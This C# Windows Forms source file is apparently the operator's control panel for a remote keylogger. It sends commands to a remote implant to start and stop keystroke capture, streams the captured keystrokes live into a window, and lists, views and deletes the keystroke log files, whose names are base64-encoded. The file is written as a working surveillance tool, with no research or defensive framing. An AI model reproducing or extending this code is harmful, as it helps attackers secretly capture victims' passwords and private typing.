using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ConsoleApplication4
{
    public partial class keylogger : Form
    {
        private bool listenLive = false;

        private String puid;
        private Writer wr;
        private Listener ls; 
        public keylogger(Writer wr , Listener ls , String puid)
        {
            InitializeComponent();
            this.puid = puid; 
            this.wr = wr;
            this.ls = ls;
            ini();     

        }

         private void ini() {
            wr.sendString("a1"); // get info related on the keylogger 
            String response = ls.keyStatOuput(1500);
            if (response.Length > 0) {
                String []stats = response.Split('\n');
                if (stats.Length == 3) {
                    etatLabel.Text = stats[0];
                    activeLabel.Text = stats[1];
                    sizeLabel.Text = stats[2]; 
                }
            }
            // add live entry ! 
            addEntryLabel("Live", 1); 
            
            String output = tools.DoCommand("/C dir *.gh /B");
            String[] files = output.Split('\n');
            foreach (String f in files) {
                String file = f.TrimEnd((char)13);
                if (file.Length > 5 ) addEntryLabel(file); 

            }

        }

         private void addSuperPanel(String tag) {
             
             
         }

         private void addEntryLabel(String name , int a = 0) {
             Label l = new Label();
             l.Tag = name;
             if (a == 0)
             {
                 name = name.Substring(0, name.Length - 3);
                 name = Encoding.ASCII.GetString(Convert.FromBase64String(name));
             }
             l.Text = name;
             l.ForeColor = Color.WhiteSmoke;
             l.TextAlign = ContentAlignment.MiddleLeft;

             l.Width = flowLayoutPanel2.Width - 6;
             l.Height = 30;
             l.Font = new Font("Pt Serief", 9); 
             l.BackColor = Color.FromArgb(53,53,53) ;
             l.Margin = new Padding(3,3,3,0);
             l.Padding = new Padding(5, 5, 5, 5); 

             l.Image = Image.FromStream(tools.getassembly("arrow.png"));
             l.ImageAlign = ContentAlignment.MiddleRight;

              
             l.MouseEnter+=l_MouseEnter;
             l.MouseLeave += l_MouseLeave;
             l.MouseClick += l_MouseClick;
             flowLayoutPanel2.Controls.Add(l); 
         }

         void l_MouseClick(object sender, MouseEventArgs e)
         {
             String a = ((Label)sender ).Tag as String;
             bool b = true; 
             foreach (Control c in screen.Controls) {
                 if (((String)c.Tag).Equals(a))
                 {
                     c.Visible = true;
                     b = false;
                 }
                 else {
                     c.Visible = false; 
                 }  
             }
             if (b) screen.Controls.Add(new SuperPanel(a));
             l_MouseEnter(sender , e) ; 
         }


         private void l_MouseEnter(object sender, EventArgs e)
         {
             ((Label)sender).Image = Image.FromStream(tools.getassembly("arrowhover.png")); 
         }
         private void l_MouseLeave(object sender, EventArgs e)
         {
             ((Label)sender).Image = Image.FromStream(tools.getassembly("arrow.png"));
         }

        private void button3_Click(object sender, EventArgs e)
        {
            updateLabel.Text = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
            AboutFiles af = new AboutFiles(wr,ls);
            af.ShowDialog(); 

        }

        private void button1_Click(object sender, EventArgs e)
        {
            Button b = sender as Button;
            if (b.Text == "Start")
            {
                etatLabel.Text = "Working"; 
                b.Text = "Stop";
                wr.sendString("01");
            }
            else {
                etatLabel.Text = "Not Working"; 

                b.Text = "Start";
                wr.sendString("02"); 
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            deleteFiles df = new deleteFiles(wr,ls);
            df.ShowDialog(); 
        }

        private  async void live_Click(object sender, EventArgs e)
        {
            if (((Button)sender).Text == "Start")
            {
                listenLive = true; 
                button2.Text = "Stop";
                etatLabel.Text = "Working";
                wr.sendString("l1");  // start live key loging   
                
                // TODO take care of rapid clicking :v 
                    liveListener.RunWorkerAsync(); 
            }
            else {
                listenLive = false; 
               
                etatLabel.Text = "Not Working";
                wr.sendString("l2");  // start live key loging 
                
                button2.Enabled = false;
                await Task.Delay(1510); 
                button2.Enabled = true; 
                button2.Text = "Start";
            }
        }

        private void liveListener_DoWork(object sender, DoWorkEventArgs e)
        {
             
                e.Result = ls.liveKey();
              
        }

        private async  void liveListener_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            String st =(String) e.Result;
            if(st.Length > 0 )
            LiveText.AppendText(st);
            await Task.Delay(1500); 
            if(listenLive)liveListener.RunWorkerAsync(); 
        }

        private void keylogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (button2.Text == "Start") {
                wr.sendString("l2"); 
            }
        }

      
    }
}
